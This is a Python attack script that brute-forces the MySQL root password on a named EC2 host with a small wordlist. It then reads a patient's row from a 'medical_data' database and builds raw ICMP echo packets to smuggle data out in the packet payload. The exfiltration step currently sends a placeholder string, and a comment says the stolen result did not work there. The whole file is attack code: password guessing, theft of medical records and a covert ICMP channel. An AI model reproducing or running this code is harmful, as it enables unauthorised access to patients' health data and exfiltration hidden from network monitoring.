import mysql.connector as mysql
import os, sys, socket, struct, select, time
import datetime

# Crack password

# function that checks if pw is correct
def connect(pw):
    try:
        db = mysql.connect(
            host = "ec2-54-161-19-249.compute-1.amazonaws.com",
            user = "root",
            passwd = pw
        )
        return("success")
    except:
        return("wrong")

# we need a good wordlist...
wordlist=["password321", "Password!123"]

for word in wordlist:
    print(word)
    if connect(word)=='success':
        pw = word

# Get data
db = mysql.connect(
    host = "ec2-54-161-19-249.compute-1.amazonaws.com",
    user = "root",
    passwd = pw
)

cursor = db.cursor()

cursor.execute("use medical_data;")

cursor.execute("select * from patients where name = 'Our Guy';")
result = cursor.fetchall()

# helper function to make result a string
def string(x):
    if isinstance(x, int): return str(x)
    elif isinstance(x, datetime.date): return x.strftime("%Y-%m-%d")

    return x

#result in string format
res_str = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([string(x) for x in tup]) for tup in result])

print("sending:", res_str)

# Exfiltrate data in a packet header
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + (data[i + 1])
    if n:
        s += (data[i + 1] << 8)
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s

def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
    if packetsize:
        ICMP_LEN_BYTES = packetsize
    else:
        ICMP_LEN_BYTES = 64

    socket.setdefaulttimeout(timeout)
    try:
        icmp = socket.getprotobyname('icmp')
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
    except socket.error as e:
        raise e

    ICMP_ECHO_REQUEST = 8
    ICMP_CODE = 0
    ICMP_ID = os.getpid() & 0xFFFF
    ICMP_CHECKSUM = 0
    ICMP_SEQ = seq

    dest_addr = socket.gethostbyname(dest_addr)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST,
        ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQ)
    bytesInDouble = struct.calcsize("d")
    data = "hello me@me.com 1287308198" * 20 #res_str doesn't work here for some reason???
    data = struct.pack("d", time.time()) + data.encode()

    ICMP_CHECKSUM = checksum(header + data)

    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, ICMP_CODE,
        socket.htons(ICMP_CHECKSUM), ICMP_ID, ICMP_SEQ)

    packet = header + data

    s.sendto(packet, (dest_addr, 0))

    while True:
        try:
            recPacket, addr = s.recvfrom(1024)
            timeReceived = time.time()
            icmpHeader = recPacket[20:28]
            _type, _code, _checksum, _packetID, _sequence = struct.unpack(
                'bbHHh', icmpHeader)
            if _packetID == ICMP_ID:
                _ttl = struct.unpack("B", recPacket[8:9])[0]
                timeSent = struct.unpack(
                    "d", recPacket[28:28 + bytesInDouble])[0]
                delay = (timeReceived - timeSent) * 1000
                print (
                    "%d Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
                    % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay, recPacket[36:]))
                time.sleep(1)
                return delay
        except socket.timeout:
            print("Request timeout for icmp_seq", ICMP_SEQ)
            return False
        except Exception as e:
            raise e


sendOnePing(1, "ec2-54-161-19-249.compute-1.amazonaws.com", 102)
